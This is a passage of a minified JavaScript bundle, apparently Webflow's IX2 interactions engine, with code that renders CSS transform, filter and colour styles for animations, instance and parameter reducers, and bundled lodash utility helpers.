                    i = t[e] || {},
                    a = i.xValue,
                    r = void 0 === a ? n.xValue : a,
                    o = i.yValue,
                    c = void 0 === o ? n.yValue : o,
                    s = i.zValue,
                    u = void 0 === s ? n.zValue : s,
                    d = i.xUnit,
                    f = void 0 === d ? "" : d,
                    l = i.yUnit,
                    p = void 0 === l ? "" : l,
                    E = i.zUnit,
                    v = void 0 === E ? "" : E;
                  switch (e) {
                    case $:
                      return ""
                        .concat(m, "(")
                        .concat(r)
                        .concat(f, ", ")
                        .concat(c)
                        .concat(p, ", ")
                        .concat(u)
                        .concat(v, ")");
                    case J:
                      return ""
                        .concat(b, "(")
                        .concat(r)
                        .concat(f, ", ")
                        .concat(c)
                        .concat(p, ", ")
                        .concat(u)
                        .concat(v, ")");
                    case ee:
                      return ""
                        .concat(O, "(")
                        .concat(r)
                        .concat(f, ") ")
                        .concat(S, "(")
                        .concat(c)
                        .concat(p, ") ")
                        .concat(L, "(")
                        .concat(u)
                        .concat(v, ")");
                    case te:
                      return ""
                        .concat(A, "(")
                        .concat(r)
                        .concat(f, ", ")
                        .concat(c)
                        .concat(p, ")");
                    default:
                      return "";
                  }
                }).join(" "),
                f = a.setStyle;
              Re(e, y.TRANSFORM_PREFIXED, a),
                f(e, y.TRANSFORM_PREFIXED, d),
                (r = n),
                (o = i.actionTypeId),
                (c = r.xValue),
                (s = r.yValue),
                (u = r.zValue),
                ((o === $ && void 0 !== u) ||
                  (o === J && void 0 !== u) ||
                  (o === ee && (void 0 !== c || void 0 !== s))) &&
                  f(e, y.TRANSFORM_STYLE_PREFIXED, w);
            })(e, t, n, a, o);
          case K:
            return (function (e, t, n, i, a, r) {
              var o = r.setStyle,
                c = i.actionTypeId,
                s = i.config;
              switch (c) {
                case ae:
                  var u = i.config,
                    d = u.widthUnit,
                    l = void 0 === d ? "" : d,
                    p = u.heightUnit,
                    E = void 0 === p ? "" : p,
                    v = n.widthValue,
                    I = n.heightValue;
                  void 0 !== v &&
                    (l === X && (l = "px"), Re(e, x, r), o(e, x, v + l)),
                    void 0 !== I &&
                      (E === X && (E = "px"), Re(e, M, r), o(e, M, I + E));
                  break;
                case ie:
                  !(function (e, t, n, i) {
                    var a = (0, f.default)(
                        t,
                        function (e, t, i) {
                          return ""
                            .concat(e, " ")
                            .concat(i, "(")
                            .concat(t)
                            .concat(Se(i, n), ")");
                        },
                        ""
                      ),
                      r = i.setStyle;
                    Re(e, C, i), r(e, C, a);
                  })(e, n, s, r);
                  break;
                case re:
                case oe:
                case ce:
                  var g = fe[c],
                    y = Math.round(n.rValue),
                    T = Math.round(n.gValue),
                    h = Math.round(n.bValue),
                    _ = n.aValue;
                  Re(e, g, r),
                    o(
                      e,
                      g,
                      _ >= 1
                        ? "rgb(".concat(y, ",").concat(T, ",").concat(h, ")")
                        : "rgba("
                            .concat(y, ",")
                            .concat(T, ",")
                            .concat(h, ",")
                            .concat(_, ")")
                    );
                  break;
                default:
                  var m = s.unit,
                    b = void 0 === m ? "" : m;
                  Re(e, a, r), o(e, a, n.value + b);
              }
            })(e, 0, n, a, r, o);
          case H:
            return (function (e, t, n) {
              var i = n.setStyle;
              if (t.actionTypeId !== se);
              else {
                var a = t.config.value;
                a === R && y.IS_BROWSER_ENV
                  ? i(e, B, y.FLEX_PREFIXED)
                  : i(e, B, a);
              }
            })(e, a, o);
          case q:
            var u = a.actionTypeId;
            if ((0, g.isPluginType)(u)) return (0, g.renderPlugin)(u)(s, t, a);
        }
      }),
      (t.clearAllStyles = function (e) {
        var t = e.store,
          n = e.elementApi,
          i = t.getState().ixData,
          a = i.events,
          r = void 0 === a ? {} : a,
          o = i.actionLists,
          c = void 0 === o ? {} : o;
        Object.keys(r).forEach(function (e) {
          var t = r[e],
            i = t.action.config.actionListId,
            a = c[i];
          a && Ce({ actionList: a, event: t, elementApi: n });
        }),
          Object.keys(c).forEach(function (e) {
            Ce({ actionList: c[e], elementApi: n });
          });
      }),
      (t.cleanupHTMLElement = function (e, t, n) {
        var i = n.setStyle,
          a = n.getStyle,
          r = t.actionTypeId;
        if (r === ae) {
          var o = t.config;
          o.widthUnit === X && i(e, x, ""), o.heightUnit === X && i(e, M, "");
        }
        a(e, j) && Me({ effect: Ne, actionTypeId: r, elementApi: n })(e);
      }),
      (t.getMaxDurationItemIndex = De),
      (t.getActionListProgress = function (e, t) {
        var n = e.actionItemGroups,
          i = e.useFirstGroupAsInitialState,
          a = t.actionItem,
          r = t.verboseTimeElapsed,
          o = void 0 === r ? 0 : r,
          c = 0,
          s = 0;
        return (
          n.forEach(function (e, t) {
            if (!i || 0 !== t) {
              var n = e.actionItems,
                r = n[De(n)],
                u = r.config,
                d = r.actionTypeId;
              a.id === r.id && (s = c + o);
              var f = me(d) === H ? 0 : u.duration;
              c += u.delay + f;
            }
          }),
          c > 0 ? (0, I.optimizeFloat)(s / c) : 0
        );
      }),
      (t.reduceListToGroup = function (e) {
        var t = e.actionList,
          n = e.actionItemId,
          i = e.rawData,
          a = t.actionItemGroups,
          r = t.continuousParameterGroups,
          o = [],
          c = function (e) {
            return (
              o.push((0, p.mergeIn)(e, ["config"], { delay: 0, duration: 0 })),
              e.id === n
            );
          };
        return (
          a &&
            a.some(function (e) {
              return e.actionItems.some(c);
            }),
          r &&
            r.some(function (e) {
              return e.continuousActionGroups.some(function (e) {
                return e.actionItems.some(c);
              });
            }),
          (0, p.setIn)(
            i,
            ["actionLists"],
            (0, s.default)({}, t.id, {
              id: t.id,
              actionItemGroups: [{ actionItems: o }],
            })
          )
        );
      }),
      (t.shouldNamespaceEventParameter = function (e, t) {
        var n = t.basedOn;
        return (
          (e === E.EventTypeConsts.SCROLLING_IN_VIEW &&
            (n === E.EventBasedOn.ELEMENT || null == n)) ||
          (e === E.EventTypeConsts.MOUSE_MOVE && n === E.EventBasedOn.ELEMENT)
        );
      }),
      (t.getNamespacedParameterId = function (e, t) {
        return e + W + t;
      }),
      (t.shouldAllowMediaQuery = function (e, t) {
        return null == t || -1 !== e.indexOf(t);
      }),
      (t.mediaQueriesEqual = function (e, t) {
        return (0, v.default)(e && e.sort(), t && t.sort());
      }),
      (t.stringifyTarget = function (e) {
        if ("string" == typeof e) return e;
        var t = e.id,
          n = void 0 === t ? "" : t,
          i = e.selector,
          a = void 0 === i ? "" : i,
          r = e.useEventTarget;
        return n + z + a + z + (void 0 === r ? "" : r);
      }),
      Object.defineProperty(t, "shallowEqual", {
        enumerable: !0,
        get: function () {
          return v.default;
        },
      }),
      (t.getItemConfigByKey = void 0);
    var d = u(n(270)),
      f = u(n(271)),
      l = u(n(277)),
      p = n(22),
      E = n(3),
      v = u(n(279)),
      I = n(118),
      g = n(120),
      y = n(47),
      T = E.IX2EngineConstants,
      h = T.BACKGROUND,
      _ = T.TRANSFORM,
      m = T.TRANSLATE_3D,
      b = T.SCALE_3D,
      O = T.ROTATE_X,
      S = T.ROTATE_Y,
      L = T.ROTATE_Z,
      A = T.SKEW,
      w = T.PRESERVE_3D,
      R = T.FLEX,
      N = T.OPACITY,
      C = T.FILTER,
      x = T.WIDTH,
      M = T.HEIGHT,
      P = T.BACKGROUND_COLOR,
      D = T.BORDER_COLOR,
      F = T.COLOR,
      V = T.CHILDREN,
      U = T.IMMEDIATE_CHILDREN,
      k = T.SIBLINGS,
      G = T.PARENT,
      B = T.DISPLAY,
      j = T.WILL_CHANGE,
      X = T.AUTO,
      Y = T.COMMA_DELIMITER,
      W = T.COLON_DELIMITER,
      z = T.BAR_DELIMITER,
      Q = T.RENDER_TRANSFORM,
      H = T.RENDER_GENERAL,
      K = T.RENDER_STYLE,
      q = T.RENDER_PLUGIN,
      Z = E.ActionTypeConsts,
      $ = Z.TRANSFORM_MOVE,
      J = Z.TRANSFORM_SCALE,
      ee = Z.TRANSFORM_ROTATE,
      te = Z.TRANSFORM_SKEW,
      ne = Z.STYLE_OPACITY,
      ie = Z.STYLE_FILTER,
      ae = Z.STYLE_SIZE,
      re = Z.STYLE_BACKGROUND_COLOR,
      oe = Z.STYLE_BORDER,
      ce = Z.STYLE_TEXT_COLOR,
      se = Z.GENERAL_DISPLAY,
      ue = "OBJECT_VALUE",
      de = function (e) {
        return e.trim();
      },
      fe = Object.freeze(
        ((i = {}),
        (0, s.default)(i, re, P),
        (0, s.default)(i, oe, D),
        (0, s.default)(i, ce, F),
        i)
      ),
      le = Object.freeze(
        ((a = {}),
        (0, s.default)(a, y.TRANSFORM_PREFIXED, _),
        (0, s.default)(a, P, h),
        (0, s.default)(a, N, N),
        (0, s.default)(a, C, C),
        (0, s.default)(a, x, x),
        (0, s.default)(a, M, M),
        a)
      ),
      pe = {},
      Ee = 1,
      ve = 1,
      Ie = function (e, t) {
        return e === t;
      };
    function ge(e) {
      var t = (0, c.default)(e);
      return "string" === t
        ? { id: e }
        : null != e && "object" === t
        ? {
            id: e.id,
            objectId: e.objectId,
            selector: e.selector,
            selectorGuids: e.selectorGuids,
            appliesTo: e.appliesTo,
            useEventTarget: e.useEventTarget,
          }
        : {};
    }
    function ye(e) {
      var t,
        n,
        i,
        a = e.config,
        r = e.event,
        o = e.eventTarget,
        c = e.elementRoot,
        s = e.elementApi;
      if (!s) throw new Error("IX2 missing elementApi");
      var u = a.targets;
      if (Array.isArray(u) && u.length > 0)
        return u.reduce(function (e, t) {
          return e.concat(
            ye({
              config: { target: t },
              event: r,
              eventTarget: o,
              elementRoot: c,
              elementApi: s,
            })
          );
        }, []);
      var d = s.getValidDocument,
        f = s.getQuerySelector,
        l = s.queryDocument,
        p = s.getChildElements,
        v = s.getSiblingElements,
        I = s.matchSelector,
        g = s.elementContains,
        T = s.isSiblingNode,
        h = a.target;
      if (!h) return [];
      var _ = ge(h),
        m = _.id,
        b = _.objectId,
        O = _.selector,
        S = _.selectorGuids,
        L = _.appliesTo,
        A = _.useEventTarget;
      if (b) return [pe[b] || (pe[b] = {})];
      if (L === E.EventAppliesTo.PAGE) {
        var w = d(m);
        return w ? [w] : [];
      }
      var R,
        N,
        C,
        x =
          (null !==
            (t =
              null == r ||
              null === (n = r.action) ||
              void 0 === n ||
              null === (i = n.config) ||
              void 0 === i
                ? void 0
                : i.affectedElements) && void 0 !== t
            ? t
            : {})[m || O] || {},
        M = Boolean(x.id || x.selector),
        P = r && f(ge(r.target));
      if (
        (M
          ? ((R = x.limitAffectedElements), (N = P), (C = f(x)))
          : (N = C = f({ id: m, selector: O, selectorGuids: S })),
        r && A)
      ) {
        var D = o && (C || !0 === A) ? [o] : l(P);
        if (C) {
          if (A === G)
            return l(C).filter(function (e) {
              return D.some(function (t) {
                return g(e, t);
              });
            });
          if (A === V)
            return l(C).filter(function (e) {
              return D.some(function (t) {
                return g(t, e);
              });
            });
          if (A === k)
            return l(C).filter(function (e) {
              return D.some(function (t) {
                return T(t, e);
              });
            });
        }
        return D;
      }
      return null == N || null == C
        ? []
        : y.IS_BROWSER_ENV && c
        ? l(C).filter(function (e) {
            return c.contains(e);
          })
        : R === V
        ? l(N, C)
        : R === U
        ? p(l(N)).filter(I(C))
        : R === k
        ? v(l(N)).filter(I(C))
        : l(C);
    }
    var Te = /px/,
      he = function (e, t) {
        return t.reduce(function (e, t) {
          return null == e[t.type] && (e[t.type] = Oe[t.type]), e;
        }, e || {});
      },
      _e = function (e, t) {
        return t && (e[t.type] = t.value || 0), e;
      };
    function me(e) {
      return /^TRANSFORM_/.test(e)
        ? Q
        : /^STYLE_/.test(e)
        ? K
        : /^GENERAL_/.test(e)
        ? H
        : /^PLUGIN_/.test(e)
        ? q
        : void 0;
    }
    t.getItemConfigByKey = function (e, t, n) {
      if ((0, g.isPluginType)(e)) return (0, g.getPluginConfig)(e)(n, t);
      if (e === ie) {
        var i = (0, l.default)(n.filters, function (e) {
          return e.type === t;
        });
        return i ? i.value : 0;
      }
      return n[t];
    };
    var be =
        ((r = {}),
        (0, s.default)(
          r,
          $,
          Object.freeze({ xValue: 0, yValue: 0, zValue: 0 })
        ),
        (0, s.default)(
          r,
          J,
          Object.freeze({ xValue: 1, yValue: 1, zValue: 1 })
        ),
        (0, s.default)(
          r,
          ee,
          Object.freeze({ xValue: 0, yValue: 0, zValue: 0 })
        ),
        (0, s.default)(r, te, Object.freeze({ xValue: 0, yValue: 0 })),
        r),
      Oe = Object.freeze({
        blur: 0,
        "hue-rotate": 0,
        invert: 0,
        grayscale: 0,
        saturate: 100,
        sepia: 0,
        contrast: 100,
        brightness: 100,
      }),
      Se = function (e, t) {
        var n = (0, l.default)(t.filters, function (t) {
          return t.type === e;
        });
        if (n && n.unit) return n.unit;
        switch (e) {
          case "blur":
            return "px";
          case "hue-rotate":
            return "deg";
          default:
            return "%";
        }
      },
      Le = Object.keys(be),
      Ae = /^rgb/,
      we = RegExp("rgba?".concat("\\(([^)]+)\\)"));
    function Re(e, t, n) {
      if (y.IS_BROWSER_ENV) {
        var i = le[t];
        if (i) {
          var a = n.getStyle,
            r = n.setStyle,
            o = a(e, j);
          if (o) {
            var c = o.split(Y).map(de);
            -1 === c.indexOf(i) && r(e, j, c.concat(i).join(Y));
          } else r(e, j, i);
        }
      }
    }
    function Ne(e, t, n) {
      if (y.IS_BROWSER_ENV) {
        var i = le[t];
        if (i) {
          var a = n.getStyle,
            r = n.setStyle,
            o = a(e, j);
          o &&
            -1 !== o.indexOf(i) &&
            r(
              e,
              j,
              o
                .split(Y)
                .map(de)
                .filter(function (e) {
                  return e !== i;
                })
                .join(Y)
            );
        }
      }
    }
    function Ce(e) {
      var t = e.actionList,
        n = void 0 === t ? {} : t,
        i = e.event,
        a = e.elementApi,
        r = n.actionItemGroups,
        o = n.continuousParameterGroups;
      r &&
        r.forEach(function (e) {
          xe({ actionGroup: e, event: i, elementApi: a });
        }),
        o &&
          o.forEach(function (e) {
            e.continuousActionGroups.forEach(function (e) {
              xe({ actionGroup: e, event: i, elementApi: a });
            });
          });
    }
    function xe(e) {
      var t = e.actionGroup,
        n = e.event,
        i = e.elementApi;
      t.actionItems.forEach(function (e) {
        var t,
          a = e.actionTypeId,
          r = e.config;
        (t = (0, g.isPluginType)(a)
          ? (0, g.clearPlugin)(a)
          : Me({ effect: Pe, actionTypeId: a, elementApi: i })),
          ye({ config: r, event: n, elementApi: i }).forEach(t);
      });
    }
    var Me = function (e) {
      var t = e.effect,
        n = e.actionTypeId,
        i = e.elementApi;
      return function (e) {
        switch (n) {
          case $:
          case J:
          case ee:
          case te:
            t(e, y.TRANSFORM_PREFIXED, i);
            break;
          case ie:
            t(e, C, i);
            break;
          case ne:
            t(e, N, i);
            break;
          case ae:
            t(e, x, i), t(e, M, i);
            break;
          case re:
          case oe:
          case ce:
            t(e, fe[n], i);
            break;
          case se:
            t(e, B, i);
        }
      };
    };
    function Pe(e, t, n) {
      var i = n.setStyle;
      Ne(e, t, n),
        i(e, t, ""),
        t === y.TRANSFORM_PREFIXED && i(e, y.TRANSFORM_STYLE_PREFIXED, "");
    }
    function De(e) {
      var t = 0,
        n = 0;
      return (
        e.forEach(function (e, i) {
          var a = e.config,
            r = a.delay + a.duration;
          r >= t && ((t = r), (n = i));
        }),
        n
      );
    }
  },
  function (e, t) {
    e.exports = function (e, t) {
      return null == e || e != e ? t : e;
    };
  },
  function (e, t, n) {
    var i = n(272),
      a = n(121),
      r = n(10),
      o = n(276),
      c = n(2);
    e.exports = function (e, t, n) {
      var s = c(e) ? i : o,
        u = arguments.length < 3;
      return s(e, r(t, 4), n, u, a);
    };
  },
  function (e, t) {
    e.exports = function (e, t, n, i) {
      var a = -1,
        r = null == e ? 0 : e.length;
      for (i && r && (n = e[++a]); ++a < r; ) n = t(n, e[a], a, e);
      return n;
    };
  },
  function (e, t, n) {
    var i = n(274)();
    e.exports = i;
  },
  function (e, t) {
    e.exports = function (e) {
      return function (t, n, i) {
        for (var a = -1, r = Object(t), o = i(t), c = o.length; c--; ) {
          var s = o[e ? c : ++a];
          if (!1 === n(r[s], s, r)) break;
        }
        return t;
      };
    };
  },
  function (e, t, n) {
    var i = n(16);
    e.exports = function (e, t) {
      return function (n, a) {
        if (null == n) return n;
        if (!i(n)) return e(n, a);
        for (
          var r = n.length, o = t ? r : -1, c = Object(n);
          (t ? o-- : ++o < r) && !1 !== a(c[o], o, c);

        );
        return n;
      };
    };
  },
  function (e, t) {
    e.exports = function (e, t, n, i, a) {
      return (
        a(e, function (e, a, r) {
          n = i ? ((i = !1), e) : t(n, e, a, r);
        }),
        n
      );
    };
  },
  function (e, t, n) {
    var i = n(96)(n(278));
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(114),
      a = n(10),
      r = n(115),
      o = Math.max,
      c = Math.min;
    e.exports = function (e, t, n) {
      var s = null == e ? 0 : e.length;
      if (!s) return -1;
      var u = s - 1;
      return (
        void 0 !== n && ((u = r(n)), (u = n < 0 ? o(s + u, 0) : c(u, s - 1))),
        i(e, a(t, 3), u, !0)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var i = n(1)(n(17));
    Object.defineProperty(t, "__esModule", { value: !0 }), (t.default = void 0);
    var a = Object.prototype.hasOwnProperty;
    function r(e, t) {
      return e === t ? 0 !== e || 0 !== t || 1 / e == 1 / t : e != e && t != t;
    }
    t.default = function (e, t) {
      if (r(e, t)) return !0;
      if (
        "object" !== (0, i.default)(e) ||
        null === e ||
        "object" !== (0, i.default)(t) ||
        null === t
      )
        return !1;
      var n = Object.keys(e),
        o = Object.keys(t);
      if (n.length !== o.length) return !1;
      for (var c = 0; c < n.length; c++)
        if (!a.call(t, n[c]) || !r(e[n[c]], t[n[c]])) return !1;
      return !0;
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.ixInstances = void 0);
    var i = n(3),
      a = n(14),
      r = n(22),
      o = i.IX2EngineActionTypes,
      c = o.IX2_RAW_DATA_IMPORTED,
      s = o.IX2_SESSION_STOPPED,
      u = o.IX2_INSTANCE_ADDED,
      d = o.IX2_INSTANCE_STARTED,
      f = o.IX2_INSTANCE_REMOVED,
      l = o.IX2_ANIMATION_FRAME_CHANGED,
      p = a.IX2EasingUtils,
      E = p.optimizeFloat,
      v = p.applyEasing,
      I = p.createBezierEasing,
      g = i.IX2EngineConstants.RENDER_GENERAL,
      y = a.IX2VanillaUtils,
      T = y.getItemConfigByKey,
      h = y.getRenderType,
      _ = y.getStyleProp,
      m = function (e, t) {
        var n = e.position,
          i = e.parameterId,
          a = e.actionGroups,
          o = e.destinationKeys,
          c = e.smoothing,
          s = e.restingValue,
          u = e.actionTypeId,
          d = e.customEasingFn,
          f = e.skipMotion,
          l = e.skipToValue,
          p = t.payload.parameters,
          I = Math.max(1 - c, 0.01),
          g = p[i];
        null == g && ((I = 1), (g = s));
        var y,
          h,
          _,
          m,
          b = Math.max(g, 0) || 0,
          O = E(b - n),
          S = f ? l : E(n + O * I),
          L = 100 * S;
        if (S === n && e.current) return e;
        for (var A = 0, w = a.length; A < w; A++) {
          var R = a[A],
            N = R.keyframe,
            C = R.actionItems;
          if ((0 === A && (y = C[0]), L >= N)) {
            y = C[0];
            var x = a[A + 1],
              M = x && L !== N;
            (h = M ? x.actionItems[0] : null),
              M && ((_ = N / 100), (m = (x.keyframe - N) / 100));
          }
        }
        var P = {};
        if (y && !h)
          for (var D = 0, F = o.length; D < F; D++) {
            var V = o[D];
            P[V] = T(u, V, y.config);
          }
        else if (y && h && void 0 !== _ && void 0 !== m)
          for (
            var U = (S - _) / m,
              k = y.config.easing,
              G = v(k, U, d),
              B = 0,
              j = o.length;
            B < j;
            B++
          ) {
            var X = o[B],
              Y = T(u, X, y.config),
              W = (T(u, X, h.config) - Y) * G + Y;
            P[X] = W;
          }
        return (0, r.merge)(e, { position: S, current: P });
      },
      b = function (e, t) {
        var n = e,
          i = n.active,
          a = n.origin,
          o = n.start,
          c = n.immediate,
          s = n.renderType,
          u = n.verbose,
          d = n.actionItem,
          f = n.destination,
          l = n.destinationKeys,
          p = n.pluginDuration,
          I = n.instanceDelay,
          y = n.customEasingFn,
          T = n.skipMotion,
          h = d.config.easing,
          _ = d.config,
          m = _.duration,
          b = _.delay;
        null != p && (m = p),
          (b = null != I ? I : b),
          s === g ? (m = 0) : (c || T) && (m = b = 0);
        var O = t.payload.now;
        if (i && a) {
          var S = O - (o + b);
          if (u) {
            var L = O - o,
              A = m + b,
              w = E(Math.min(Math.max(0, L / A), 1));
            e = (0, r.set)(e, "verboseTimeElapsed", A * w);
          }
          if (S < 0) return e;
          var R = E(Math.min(Math.max(0, S / m), 1)),
            N = v(h, R, y),
            C = {},
            x = null;
          return (
            l.length &&
              (x = l.reduce(function (e, t) {
                var n = f[t],
                  i = parseFloat(a[t]) || 0,
                  r = (parseFloat(n) - i) * N + i;
                return (e[t] = r), e;
              }, {})),
            (C.current = x),
            (C.position = R),
            1 === R && ((C.active = !1), (C.complete = !0)),
            (0, r.merge)(e, C)
          );
        }
        return e;
      };
    t.ixInstances = function () {
      var e =
          arguments.length > 0 && void 0 !== arguments[0]
            ? arguments[0]
            : Object.freeze({}),
        t = arguments.length > 1 ? arguments[1] : void 0;
      switch (t.type) {
        case c:
          return t.payload.ixInstances || Object.freeze({});
        case s:
          return Object.freeze({});
        case u:
          var n = t.payload,
            i = n.instanceId,
            a = n.elementId,
            o = n.actionItem,
            p = n.eventId,
            E = n.eventTarget,
            v = n.eventStateKey,
            g = n.actionListId,
            y = n.groupIndex,
            T = n.isCarrier,
            O = n.origin,
            S = n.destination,
            L = n.immediate,
            A = n.verbose,
            w = n.continuous,
            R = n.parameterId,
            N = n.actionGroups,
            C = n.smoothing,
            x = n.restingValue,
            M = n.pluginInstance,
            P = n.pluginDuration,
            D = n.instanceDelay,
            F = n.skipMotion,
            V = n.skipToValue,
            U = o.actionTypeId,
            k = h(U),
            G = _(k, U),
            B = Object.keys(S).filter(function (e) {
              return null != S[e];
            }),
            j = o.config.easing;
          return (0, r.set)(e, i, {
            id: i,
            elementId: a,
            active: !1,
            position: 0,
            start: 0,
            origin: O,
            destination: S,
            destinationKeys: B,
            immediate: L,
            verbose: A,
            current: null,
            actionItem: o,
            actionTypeId: U,
            eventId: p,
            eventTarget: E,
            eventStateKey: v,
            actionListId: g,
            groupIndex: y,
            renderType: k,
            isCarrier: T,
            styleProp: G,
            continuous: w,
            parameterId: R,
            actionGroups: N,
            smoothing: C,
            restingValue: x,
            pluginInstance: M,
            pluginDuration: P,
            instanceDelay: D,
            skipMotion: F,
            skipToValue: V,
            customEasingFn: Array.isArray(j) && 4 === j.length ? I(j) : void 0,
          });
        case d:
          var X = t.payload,
            Y = X.instanceId,
            W = X.time;
          return (0, r.mergeIn)(e, [Y], { active: !0, complete: !1, start: W });
        case f:
          var z = t.payload.instanceId;
          if (!e[z]) return e;
          for (
            var Q = {}, H = Object.keys(e), K = H.length, q = 0;
            q < K;
            q++
          ) {
            var Z = H[q];
            Z !== z && (Q[Z] = e[Z]);
          }
          return Q;
        case l:
          for (
            var $ = e, J = Object.keys(e), ee = J.length, te = 0;
            te < ee;
            te++
          ) {
            var ne = J[te],
              ie = e[ne],
              ae = ie.continuous ? m : b;
            $ = (0, r.set)($, ne, ae(ie, t));
          }
          return $;
        default:
          return e;
      }
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.ixParameters = void 0);
    var i = n(3).IX2EngineActionTypes,
      a = i.IX2_RAW_DATA_IMPORTED,
      r = i.IX2_SESSION_STOPPED,
      o = i.IX2_PARAMETER_CHANGED;
    t.ixParameters = function () {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        t = arguments.length > 1 ? arguments[1] : void 0;
      switch (t.type) {
        case a:
          return t.payload.ixParameters || {};
        case r:
          return {};
        case o:
          var n = t.payload,
            i = n.key,
            c = n.value;
          return (e[i] = c), e;
        default:
          return e;
      }
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      if (null == e) return {};
      var n,
        i,
        a = {},
        r = Object.keys(e);
      for (i = 0; i < r.length; i++)
        (n = r[i]), t.indexOf(n) >= 0 || (a[n] = e[n]);
      return a;
    };
  },
  function (e, t, n) {
    var i = n(56),
      a = n(58),
      r = n(16),
      o = n(284),
      c = n(285);
    e.exports = function (e) {
      if (null == e) return 0;
      if (r(e)) return o(e) ? c(e) : e.length;
      var t = a(e);
      return "[object Map]" == t || "[object Set]" == t ? e.size : i(e).length;
    };
  },
  function (e, t, n) {
    var i = n(15),
      a = n(2),
      r = n(12);
    e.exports = function (e) {
      return (
        "string" == typeof e || (!a(e) && r(e) && "[object String]" == i(e))
      );
    };
  },
  function (e, t, n) {
    var i = n(286),
      a = n(287),
      r = n(288);
    e.exports = function (e) {
      return a(e) ? r(e) : i(e);
    };
  },
  function (e, t, n) {
    var i = n(113)("length");
    e.exports = i;
  },
  function (e, t) {
    var n = RegExp(
      "[\\u200d\\ud800-\\udfff\\u0300-\\u036f\\ufe20-\\ufe2f\\u20d0-\\u20ff\\ufe0e\\ufe0f]"
    );
    e.exports = function (e) {
      return n.test(e);
    };
  },
  function (e, t) {
    var n = "[\\u0300-\\u036f\\ufe20-\\ufe2f\\u20d0-\\u20ff]",
      i = "\\ud83c[\\udffb-\\udfff]",
      a = "[^\\ud800-\\udfff]",
      r = "(?:\\ud83c[\\udde6-\\uddff]){2}",
      o = "[\\ud800-\\udbff][\\udc00-\\udfff]",
      c = "(?:" + n + "|" + i + ")?",
      s =
        "[\\ufe0e\\ufe0f]?" +
        c +
        "(?:\\u200d(?:" +
        [a, r, o].join("|") +
        ")[\\ufe0e\\ufe0f]?" +
        c +
        ")*",
      u = "(?:" + [a + n + "?", n, r, o, "[\\ud800-\\udfff]"].join("|") + ")",
      d = RegExp(i + "(?=" + i + ")|" + u + s, "g");
    e.exports = function (e) {
      for (var t = (d.lastIndex = 0); d.test(e); ) ++t;
      return t;
    };
  },
  function (e, t, n) {
    var i = n(10),
      a = n(290),
      r = n(291);
    e.exports = function (e, t) {
      return r(e, a(i(t)));
    };
  },
  function (e, t) {
    e.exports = function (e) {
      if ("function" != typeof e) throw new TypeError("Expected a function");
      return function () {
        var t = arguments;
        switch (t.length) {
          case 0:
            return !e.call(this);
          case 1:
            return !e.call(this, t[0]);
          case 2:
            return !e.call(this, t[0], t[1]);
          case 3:
            return !e.call(this, t[0], t[1], t[2]);
        }
        return !e.apply(this, t);
      };
    };
  },
  function (e, t, n) {
    var i = n(112),
      a = n(10),
      r = n(292),
      o = n(295);
    e.exports = function (e, t) {
      if (null == e) return {};
      var n = i(o(e), function (e) {
        return [e];
      });
      return (
        (t = a(t)),
        r(e, n, function (e, n) {
          return t(e, n[0]);
        })
      );
    };
  },
  function (e, t, n) {
    var i = n(60),
      a = n(293),
      r = n(37);
    e.exports = function (e, t, n) {
      for (var o = -1, c = t.length, s = {}; ++o < c; ) {
        var u = t[o],
          d = i(e, u);
        n(d, u) && a(s, r(u, e), d);
      }
      return s;
    };
  },
  function (e, t, n) {
    var i = n(294),
      a = n(37),
      r = n(53),
      o = n(8),
      c = n(24);
    e.exports = function (e, t, n, s) {
      if (!o(e)) return e;
      for (
        var u = -1, d = (t = a(t, e)).length, f = d - 1, l = e;
        null != l && ++u < d;

      ) {
        var p = c(t[u]),
          E = n;
        if ("__proto__" === p || "constructor" === p || "prototype" === p)
          return e;
        if (u != f) {
          var v = l[p];
          void 0 === (E = s ? s(v, p, l) : void 0) &&
            (E = o(v) ? v : r(t[u + 1]) ? [] : {});
        }
        i(l, p, E), (l = l[p]);
      }
      return e;
    };
  },
  function (e, t, n) {
    var i = n(124),
      a = n(48),
      r = Object.prototype.hasOwnProperty;
    e.exports = function (e, t, n) {
      var o = e[t];
      (r.call(e, t) && a(o, n) && (void 0 !== n || t in e)) || i(e, t, n);
    };
  },
  function (e, t, n) {
    var i = n(103),
      a = n(296),
      r = n(298);
    e.exports = function (e) {
      return i(e, r, a);
    };
  },
  function (e, t, n) {
    var i = n(51),
      a = n(297),
      r = n(104),
      o = n(105),
      c = Object.getOwnPropertySymbols
        ? function (e) {
            for (var t = []; e; ) i(t, r(e)), (e = a(e));
            return t;
          }
        : o;
    e.exports = c;
  },
  function (e, t, n) {
    var i = n(108)(Object.getPrototypeOf, Object);
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(106),
      a = n(299),
      r = n(16);
    e.exports = function (e) {
      return r(e) ? i(e, !0) : a(e);
    };
  },
  function (e, t, n) {
    var i = n(8),
      a = n(57),
      r = n(300),
      o = Object.prototype.hasOwnProperty;
    e.exports = function (e) {
      if (!i(e)) return r(e);
      var t = a(e),
        n = [];
      for (var c in e)
        ("constructor" != c || (!t && o.call(e, c))) && n.push(c);
      return n;
    };
  },
  function (e, t) {
    e.exports = function (e) {
      var t = [];
      if (null != e) for (var n in Object(e)) t.push(n);
      return t;
    };
  },
  function (e, t, n) {
    var i = n(56),
      a = n(58),
      r = n(36),
      o = n(2),
      c = n(16),
      s = n(52),
      u = n(57),
      d = n(54),
      f = Object.prototype.hasOwnProperty;
    e.exports = function (e) {
      if (null == e) return !0;
      if (
        c(e) &&
        (o(e) ||
          "string" == typeof e ||
          "function" == typeof e.splice ||
          s(e) ||
          d(e) ||
          r(e))
      )
        return !e.length;
      var t = a(e);
      if ("[object Map]" == t || "[object Set]" == t) return !e.size;
      if (u(e)) return !i(e).length;
      for (var n in e) if (f.call(e, n)) return !1;
      return !0;
    };
  },
  function (e, t, n) {
    var i = n(124),
      a = n(122),
      r = n(10);
    e.exports = function (e, t) {
      var n = {};
      return (
        (t = r(t, 3)),
        a(e, function (e, a, r) {
          i(n, a, t(e, a, r));
        }),
        n
      );
    };
  },
  function (e, t, n) {
    var i = n(304),
      a = n(121),
      r = n(305),
      o = n(2);
    e.exports = function (e, t) {
